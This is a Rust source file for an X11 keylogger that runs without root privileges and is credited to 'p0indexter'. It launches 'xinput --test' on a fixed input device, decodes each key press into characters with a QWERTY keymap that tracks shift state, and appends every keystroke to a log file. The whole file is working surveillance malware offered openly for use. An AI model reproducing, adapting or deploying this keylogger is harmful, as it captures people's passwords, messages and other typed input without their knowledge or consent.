// Rootless x11 keylogger developed by p0indexter

use std::process::{Command, Stdio};
use std::path::Path;
use std::io::{BufReader, BufRead};
use std::fs::{File, OpenOptions};
use std::io::{Read, Write};

pub fn init_rootless(log_file: String){


    xinput_monitor(9, log_file);
}

// xinput --list | grep keyboard
pub fn xinput_list(){
    
}

// xinput --test $id
pub fn xinput_monitor(id: u8, log_file: String){
    let mut args: Vec<&'static str> = Vec::new();

    args.push("--test");
    args.push("9");

    exec_stream("xinput", args, log_file);
}




pub fn exec_stream<P: AsRef<Path>>(binary: P, args: Vec<&'static str>, log_file: String) {


    let mut log_file = OpenOptions::new().create(true).write(true).append(true).open(log_file).unwrap_or_else(|e| panic!("{}", e));


    let mut cmd = Command::new(binary.as_ref())
        .args(&args)
        .stdout(Stdio::piped())
        .spawn()
        .unwrap();

    {
        let stdout = cmd.stdout.as_mut().unwrap();
        let stdout_reader = BufReader::new(stdout);
        let stdout_lines = stdout_reader.lines();

        let mut shifted = false;
        let mut caps_lock = false;

        for line in stdout_lines {

            let raw = format!("{:?}", line);
            let split = raw.split(" ");
            let vec = split.collect::<Vec<&str>>();

            // println!("{:?}", vec);

            if vec[1].contains("press"){


              
                let id2 = vec[2].parse::<u16>();
                let id3 = vec[3].parse::<u16>();
                let id4 = vec[4].parse::<u16>();

                if id2.is_ok(){
                    let id = id2.unwrap();
                    
                    if id == 50 || id == 62{
                        shifted = true;
                    }

                    let value = QWERTYEnUSKeymapOutput(id, shifted);
                    match value {
                        Ok(val) => {
                            println!("{}", val);

                            let text = val.as_bytes();
                            let num_bytes = log_file.write(text).unwrap_or_else(|e| panic!("{}", e));
            
                            if num_bytes != text.len() {
                                panic!("Error while writing to log file");
                            }

                        },
                        Err(err) => println!("UnknownKey: {}", err)
                    }
                    
                }

                if id3.is_ok(){
                    let id = id3.unwrap();
                    
                    if id == 50 || id == 62{
                        shifted = true;
                    }

                    let value = QWERTYEnUSKeymapOutput(id, shifted);
                    match value {
                        Ok(val) => {
                            println!("{}", val);

                            let text = val.as_bytes();
                            let num_bytes = log_file.write(text).unwrap_or_else(|e| panic!("{}", e));
            
                            if num_bytes != text.len() {
                                panic!("Error while writing to log file");
                            }

                        },
                        Err(err) => println!("UnknownKey: {}", err)
                    }
                }

                if id4.is_ok(){
                    let id = id4.unwrap();
                    
                    if id == 50 || id == 62{
                        shifted = true;
                    }

                    let value = QWERTYEnUSKeymapOutput(id, shifted);
                    match value {
                        Ok(val) => {
                            println!("{}", val);

                            let text = val.as_bytes();
                            let num_bytes = log_file.write(text).unwrap_or_else(|e| panic!("{}", e));
            
                            if num_bytes != text.len() {
                                panic!("Error while writing to log file");
                            }

                        },
                        Err(err) => println!("UnknownKey: {}", err)
                    }
                }





            }


            if vec[1].contains("release"){


                if vec.len() > 2{
                    let id2 = vec[2].parse::<u16>();
                    if id2.is_ok(){
                        let id = id2.unwrap();
                        
                        if id == 50 || id == 62{
                            shifted = false;
                        }
                    }
                }

                if vec.len() > 3{
                    let id3 = vec[3].parse::<u16>();
                    if id3.is_ok(){
                        let id = id3.unwrap();
                        
                        if id == 50 || id == 62{
                            shifted = false;
                        }
                    }
                }

                if vec.len() > 4{
                    let id4 = vec[4].parse::<u16>();
                    if id4.is_ok(){
                        let id = id4.unwrap();
                        
                        if id == 50 || id == 62{
                            shifted = false;
                        }

                    }
                }





            }

            // if line.contains("key release"){
            //     // let mut split = line.unwrap().split(" ");
            //     // let vec = split.collect::<Vec<&str>>();
            //     // let id: u16 = vec[2] as u16;


            //     // let value = crate::input::get_key_text(id, 0);

            //     // println!("{}", value);
            // }


        }
    }

    cmd.wait().unwrap();
}






fn QWERTYEnUSKeymapOutput(input: u16, shifted: bool) -> Result<&'static str, u16> {
    if shifted {
        match input {
            9 => Ok("<Esc>"),
            10  => Ok("!"),
            11  => Ok("@"),
            12  => Ok("#"),
            13  => Ok("$"),
            14  => Ok("%"),
            15  => Ok("^"),
            16  => Ok("&"),
            17  => Ok("*"),
            18  => Ok("("),
            19  => Ok(")"),
            20  => Ok("_"),
            21  => Ok("+"),
            22  => Ok("<Backspace>"),
            23  => Ok("<Tab>"),
            24  => Ok("Q"),
            25  => Ok("W"),
            26  => Ok("E"),
            27  => Ok("R"),
            28  => Ok("T"),
            29  => Ok("Y"),
            30  => Ok("U"),
            31  => Ok("I"),
            32  => Ok("O"),
            33  => Ok("P"),
            34  => Ok("{"),
            35  => Ok("}"),
            36  => Ok("<Enter>"),
            37  => Ok("<Ctrl>"),
            38  => Ok("A"),
            39  => Ok("S"),
            40  => Ok("D"),
            41  => Ok("F"),
            42  => Ok("G"),
            43  => Ok("H"),
            44  => Ok("J"),
            45  => Ok("K"),
            46  => Ok("L"),
            47  => Ok(":"),
            48  => Ok("\""),
            49  => Ok("~"),
            50  => Ok("<Shift>"),
            51  => Ok("|"),
            52  => Ok("Z"),
            53  => Ok("X"),
            54  => Ok("C"),
            55  => Ok("V"),
            56  => Ok("B"),
            57  => Ok("N"),
            58  => Ok("M"),
            59  => Ok("<"),
            60  => Ok(">"),
            61  => Ok("?"),
            62  => Ok("<Shift>"),
            63  => Ok("*"),
            64  => Ok("<Alt>"),
            65  => Ok(" "),
            66  => Ok("}"),
            67  => Ok("<F1>"),
            68  => Ok("<F2>"),
            69  => Ok("<F3>"),
            70  => Ok("<F4>"),
            71  => Ok("<F5>"),
            72  => Ok("<F6>"),
            73  => Ok("<F7>"),
            74  => Ok("<F8>"),
            75  => Ok("<F9>"),
            76  => Ok("<F10>"),
            77  => Ok("<NumLock>"),
            78  => Ok("<ScrollLock>"),
            79  => Ok("7"),
            80  => Ok("8"),
            81  => Ok("9"),
            82  => Ok("-"),
            83  => Ok("4"),
            84  => Ok("5"),
            85  => Ok("6"),
            86  => Ok("+"),
            87  => Ok("1"),
            88  => Ok("2"),
            89  => Ok("3"),
            90  => Ok("0"),
            91  => Ok("."),
            95  => Ok("<F11>"),
            96  => Ok("<F12>"),
            104  => Ok("<Enter>"),
            105  => Ok("<Ctrl>"),
            106 => Ok("/"),
            107 => Ok("<PrintScreen>"),
            108  => Ok("<Alt>"),
            110  => Ok("<Home>"),
            111 => Ok("<Up>"),
            112 => Ok("<PageUp>"),
            113 => Ok("<Left>"),
            114 => Ok("<Right>"),
            115 => Ok("<End>"),
            116 => Ok("<Down>"),
            117 => Ok("<PageDown>"),
            118 => Ok("<Insert>"),
            119 => Ok("<Delete>"),
            127 => Ok("<PauseBreak>"),
            133 => Ok("<Win>"),
            135 => Ok("<RightClick>"),
            _      => Err(input),
        }
    } else {
        match input {
            9 => Ok("<Esc>"),
            10  => Ok("1"),
            11  => Ok("2"),
            12  => Ok("3"),
            13  => Ok("4"),
            14  => Ok("5"),
            15  => Ok("6"),
            16  => Ok("7"),
            17  => Ok("8"),
            18  => Ok("9"),
            19  => Ok("0"),
            20  => Ok("-"),
            21  => Ok("="),
            22  => Ok("<Backspace>"),
            23  => Ok("<Tab>"),
            24  => Ok("q"),
            25  => Ok("w"),
            26  => Ok("e"),
            27  => Ok("r"),
            28  => Ok("t"),
            29  => Ok("y"),
            30  => Ok("u"),
            31  => Ok("i"),
            32  => Ok("o"),
            33  => Ok("p"),
            34  => Ok("["),
            35  => Ok("]"),
            36  => Ok("<Enter>"),
            37  => Ok("<Ctrl>"),
            38  => Ok("a"),
            39  => Ok("s"),
            40  => Ok("d"),
            41  => Ok("f"),
            42  => Ok("g"),
            43  => Ok("h"),
            44  => Ok("j"),
            45  => Ok("k"),
            46  => Ok("l"),
            47  => Ok(";"),
            48  => Ok("'"),
            49  => Ok("`"),
            50  => Ok("<Shift>"),
            51  => Ok("\\"),
            52  => Ok("z"),
            53  => Ok("x"),
            54  => Ok("c"),
            55  => Ok("v"),
            56  => Ok("b"),
            57  => Ok("n"),
            58  => Ok("m"),
            59  => Ok(","),
            60  => Ok("."),
            61  => Ok("/"),
            62  => Ok("<Shift>"),
            63  => Ok("*"),
            64  => Ok("<Alt>"),
            65  => Ok(" "),
            66  => Ok("]"),
            67  => Ok("<F1>"),
            68  => Ok("<F2>"),
            69  => Ok("<F3>"),
            70  => Ok("<F4>"),
            71  => Ok("<F5>"),
            72  => Ok("<F6>"),
            73  => Ok("<F7>"),
            74  => Ok("<F8>"),
            75  => Ok("<F9>"),
            76  => Ok("<F10>"),
            77  => Ok("<NumLock>"),
            78  => Ok("<ScrollLock>"),
            79  => Ok("7"),
            80  => Ok("8"),
            81  => Ok("9"),
            82  => Ok("-"),
            83  => Ok("4"),
            84  => Ok("5"),
            85  => Ok("6"),
            86  => Ok("+"),
            87  => Ok("1"),
            88  => Ok("2"),
            89  => Ok("3"),
            90  => Ok("0"),
            91  => Ok("."),
            95  => Ok("<F11>"),
            96  => Ok("<F12>"),
            104  => Ok("<Enter>"),
            105  => Ok("<Ctrl>"),
            106 => Ok("/"),
            107 => Ok("<PrintScreen>"),
            108  => Ok("<Alt>"),
            110  => Ok("<Home>"),
            111 => Ok("<Up>"),
            112 => Ok("<PageUp>"),
            113 => Ok("<Left>"),
            114 => Ok("<Right>"),
            115 => Ok("<End>"),
            116 => Ok("<Down>"),
            117 => Ok("<PageDown>"),
            118 => Ok("<Insert>"),
            119 => Ok("<Delete>"),
            127 => Ok("<PauseBreak>"),
            133 => Ok("<Win>"),
            135 => Ok("<RightClick>"),
            _      => Err(input),
        }
    }

}